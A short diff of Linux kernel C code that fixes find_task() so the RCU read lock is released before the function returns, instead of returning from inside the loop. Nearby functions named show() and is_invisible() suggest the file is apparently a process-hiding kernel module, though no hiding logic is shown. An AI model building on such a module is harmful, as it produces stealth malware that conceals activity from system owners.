@@ -136,12 +136,18 @@ void show(void) {
 
 struct task_struct *find_task(pid_t pid){
 	struct task_struct *p = current;
-	
+	struct task_struct *ret = NULL;	
+
 	rcu_read_lock();
-	for_each_process(p) if (p->pid == pid) return get_task_struct(p);
+	for_each_process(p) {
+		if (p->pid == pid) {
+			get_task_struct(p);
+			ret = p;
+		}
+	}
 	rcu_read_unlock();	
 
-	return NULL;
+	return ret;
 }
 
 int is_invisible(pid_t pid){
